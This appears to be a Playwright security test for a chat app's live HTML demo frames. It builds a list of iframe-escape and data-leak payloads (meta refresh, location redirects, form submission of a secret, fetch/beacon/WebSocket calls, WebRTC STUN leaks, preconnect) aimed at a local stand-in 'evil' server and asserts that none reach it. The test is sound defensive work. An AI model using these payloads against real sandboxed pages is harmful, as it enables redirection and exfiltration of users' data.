import { createSocket } from "node:dgram";
import { createServer } from "node:http";
import { createServer as createTcpServer } from "node:net";
import type { AddressInfo } from "node:net";
import { expect, test } from "@playwright/test";
import { lastAnswer, send, signIn } from "./support/chat";

/*
 * Ревью фичи 043: код демонстрации пытается увести рамку на чужой адрес, достучаться до сети или WebRTC. «Злой» сервер
 * считает запросы, UDP-сокет — пакеты STUN, TCP-приёмник — соединения без запроса (preconnect, только WebKit). Каждый приём — свой блок в ответе заглушки модели, рамки — настоящие.
 * Chromium — desktop-light, WebKit — iphone-webkit.
 */

function attacks(evil: string, stunPort: number, tcpTrap: string): Record<string, string> {
  const stun = `{iceServers:[{urls:"stun:127.0.0.1:${stunPort}"}]}`;
  const rtc = (make: string) => `<script>try{const p=${make};p.createDataChannel("x");p.createOffer().then(o=>p.setLocalDescription(o)).catch(()=>{})}catch(e){}</script>`;
  return {
    metaRefresh: `<meta http-equiv="refresh" content="0;url=${evil}/metaRefresh">`,
    closeHead: `</style></head><body><meta http-equiv=refresh content="0;url=${evil}/closeHead">`,
    metaRefreshLate: `<script>setTimeout(()=>{const m=document.createElement("meta");m.httpEquiv="refresh";m.content="0;url=${evil}/metaRefreshLate";document.body.append(m)},50)</script>`,
    locationHref: `<script>location.href="${evil}/locationHref"</script>`,
    locationReplace: `<script>setTimeout(()=>location.replace("${evil}/locationReplace"),50)</script>`,
    locationAssign: `<script>try{Object.defineProperty(window,"navigation",{value:undefined})}catch(e){};location.assign("${evil}/locationAssign")</script>`,
    anchorClick: `<a id=a href="${evil}/anchorClick">x</a><script>a.click()</script>`,
    baseAnchor: `<base href="${evil}/"><a id=a href="baseAnchor">x</a><script>a.click()</script>`,
    javascriptLink: `<a id=a href="javascript:location='${evil}/javascriptLink'">x</a><script>a.click()</script>`,
    topNavigation: `<script>try{top.location="${evil}/topNavigation"}catch(e){};try{parent.location="${evil}/parentNavigation"}catch(e){}</script>`,
    windowOpen: `<script>window.open("${evil}/windowOpen")</script>`,
    formSubmit: `<form id=f action="${evil}/formSubmit"><input name=q value=secret></form><script>f.submit()</script>`,
    network: `<script>fetch("${evil}/fetch").catch(()=>{});new Image().src="${evil}/image";navigator.sendBeacon("${evil}/beacon","x");try{new WebSocket("${evil.replace("http", "ws")}/ws")}catch(e){};try{new EventSource("${evil}/es")}catch(e){}</script>`,
    resources: `<img src="${evil}/img"><link rel=stylesheet href="${evil}/css"><style>body{background:url(${evil}/bg)}</style><svg><image href="${evil}/svg"/></svg><video src="${evil}/video"></video>`,
    prefetch: `<link rel=prefetch href="${evil}/prefetch"><link rel=preload as=image href="${evil}/preload"><link rel=preconnect href="${evil}">`,
    nestedFrame: `<iframe src="${evil}/nestedFrame"></iframe><object data="${evil}/object"></object><embed src="${evil}/embed">`,
    nestedSrcdocLeak: `<iframe srcdoc="<script>location.href='${evil}/nestedSrcdoc'</script>"></iframe>`,
    webrtc: rtc(`new RTCPeerConnection(${stun})`),
    webrtcPrefixed: rtc(`new (window.webkitRTCPeerConnection||window.mozRTCPeerConnection)(${stun})`),
    webrtcFromBlankFrame: `<script>try{const f=document.createElement("iframe");document.body.append(f);const P=f.contentWindow.RTCPeerConnection;const p=new P(${stun});p.createDataChannel("x");p.createOffer().then(o=>p.setLocalDescription(o)).catch(()=>{})}catch(e){}</script>`,
    // Ревью 2: у вложенной рамки srcdoc свой WebRTC, preconnect в WebKit открывает соединение мимо CSP.
    nestedSrcdocWebrtc: `<iframe srcdoc="<script>try{const p=new RTCPeerConnection(${stun.replace(/"/g, "&quot;")});p.createDataChannel(1);p.createOffer().then(o=>p.setLocalDescription(o))}catch(e){}</script>"></iframe>`,
    preconnect: `<link rel=preconnect href="${tcpTrap}"><script>const l=document.createElement("link");l.rel="preconnect";l.href="${tcpTrap}";document.head.append(l)</script>`,
    harmless: `<p style="height:300px">Обычная демонстрация</p>`,
  };
}

test("код демонстрации не уводит рамку и не ходит в сеть: ни одного запроса и пакета STUN", async ({ page, browserName }) => {
  const hits: string[] = [];
  const evilServer = createServer((request, response) => {
    hits.push(request.url ?? "");
    response.writeHead(200, { "content-type": "text/html" });
    response.end("<p>evil</p>");
  });
  const stunHits: number[] = [];
  const stun = createSocket("udp4").on("message", (message) => stunHits.push(message.length));
  await new Promise<void>((resolve) => evilServer.listen(0, "127.0.0.1", resolve));
  await new Promise<void>((resolve) => stun.bind(0, "127.0.0.1", resolve));
  let tcpConnections = 0;
  const tcpTrap = createTcpServer((socket) => {
    tcpConnections += 1;
    socket.on("error", () => undefined).destroy();
  });
  await new Promise<void>((resolve) => tcpTrap.listen(0, "127.0.0.1", resolve));
  const evil = `http://127.0.0.1:${(evilServer.address() as AddressInfo).port}`;
  const tcpTrapUrl = `http://127.0.0.1:${(tcpTrap.address() as AddressInfo).port}`;
  const cases = Object.values(attacks(evil, stun.address().port, tcpTrapUrl));

  try {
    // Каждый приём — свой блок ```html-demo в одном ответе: их запускает настоящая рамка чата.
    await signIn(page);
    await send(page, `Запусти демонстрации:\n${cases.join("\n-----\n")}`);
    await expect(lastAnswer(page)).toHaveAttribute("data-status", "complete");
    await expect(page.locator("[data-live-demo]")).toHaveCount(cases.length);
    // Рамки с безобидным кодом рядом работают: высота дошла через промежуточный документ.
    await expect.poll(() => page.locator('[data-live-demo="ready"] iframe').evaluateAll((frames) => frames.filter((frame) => frame.clientHeight !== 160).length)).toBeGreaterThan(3);

    // Для сравнения — обычная рамка-песочница без промежуточного документа: её уход доходит до сервера, значит, проверка
    // сеть видит. Она стартует последней, поэтому к её приходу приёмы демонстраций уже отработали.
    await page.evaluate((url) => {
      const control = document.createElement("iframe");
      control.setAttribute("sandbox", "allow-scripts");
      control.srcdoc = `<script>setTimeout(()=>location.href="${url}/control",600)<\/script>`;
      document.body.append(control);
    }, evil);
    await expect.poll(() => hits).toContain("/control");
    expect(hits.filter((hit) => hit !== "/control")).toEqual([]);
    expect(stunHits).toEqual([]);
    // preconnect проверяется только в WebKit: Chromium к адресу 127.0.0.1 заранее не соединяется и без защиты, там
    // проверка ничего не доказывает. Положительный контроль (тоже только WebKit): тот же <link> на самой странице —
    // соединение доходит, значит, приёмник его видит.
    if (browserName === "webkit") {
      expect(tcpConnections).toBe(0);
      await page.evaluate((url) => {
        const link = document.createElement("link");
        link.rel = "preconnect";
        link.href = url;
        document.head.append(link);
      }, tcpTrapUrl);
      await expect.poll(() => tcpConnections).toBeGreaterThan(0);
    }
  } finally {
    evilServer.close();
    stun.close();
    tcpTrap.close();
  }
});

